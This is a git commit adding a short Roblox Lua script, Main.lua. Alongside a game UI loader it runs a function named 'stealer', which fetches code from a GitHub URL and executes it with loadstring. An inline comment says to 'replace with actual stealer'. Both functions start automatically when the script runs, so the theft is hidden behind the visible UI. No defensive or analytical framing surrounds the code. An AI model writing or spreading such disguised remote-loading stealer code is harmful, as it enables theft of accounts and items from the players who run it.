7eaf7bfe772dfcf978fb548c04669f599a74be17
AguaHub <orocan159@gmail.com>
2025-07-21 08:01:26 +0800

    Create Main.lua

---
+++ Main.lua
@@ -0,0 +1,10 @@
+local function stealer()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/AguaHub/P-Reverse/refs/heads/main/loader.V1"))() -- replace with actual stealer
+end
+local function loadui()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/main/refs/heads/main/games/gagvisual.lua", true))("discord.gg/csxu2nCkw9")
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
